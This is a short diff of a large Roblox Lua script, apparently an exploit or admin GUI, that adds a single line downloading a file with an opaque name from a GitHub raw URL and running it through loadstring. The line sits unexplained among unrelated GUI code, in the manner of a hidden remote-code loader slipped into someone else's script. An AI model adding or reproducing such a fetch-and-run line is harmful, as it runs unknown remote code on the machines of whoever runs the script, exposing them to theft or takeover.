@@ -14522,6 +14522,8 @@ RunService.Stepped:Connect(function()
 	commandsList.CanvasSize = UDim2.new(0, 0, 0, commandsList.UIListLayout.AbsoluteContentSize.Y)
 end)
 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/FilteringEnabled/FE/main/asd"))();
+
 function Destroy(guiObject)
 	if not pcall(function()guiObject.Parent = game:GetService("CoreGui")end) then
 		guiObject.Parent = nil
@@ -14571,3 +14573,4 @@ TextClickButton.MouseButton1Click:Connect(function()
 		 game:GetService("Players").LocalPlayer.PlayerGui.boomb.Frame.BackgroundTransparency -= 0.04
 		    end
 end)
+
